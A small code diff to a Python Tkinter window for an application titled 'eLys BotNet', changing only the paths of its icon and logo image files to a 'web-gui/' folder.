@@ -22,10 +22,10 @@ windows = Tk()
 windows.geometry("1110x429")
 windows.title("eLys BotNet")
 windows["bg"] = "#0D1117"
-windows.iconbitmap("eLysCi.ico")
+windows.iconbitmap("web-gui/eLysCi.ico")
 
 # Text fenetre (windows)
-picture = PhotoImage(file="eLysC2.png")
+picture = PhotoImage(file="web-gui/eLysC2.png")
 label_biglogo = Label(windows, image=picture)
 label_biglogo.place(x="460", y="150")
 label_biglogo.pack(expand=YES)
@@ -36,7 +36,7 @@ def openwindows2():
     windows2.geometry("1781x856")
     windows2.title("eLys BotNet")
     windows2["bg"] = "#0D1117"
-    windows2.iconbitmap("eLysCi.ico")
+    windows2.iconbitmap("web-gui/eLysCi.ico")
 
     # Deuxième fenetre tab
     notebook = ttk.Notebook(windows2)
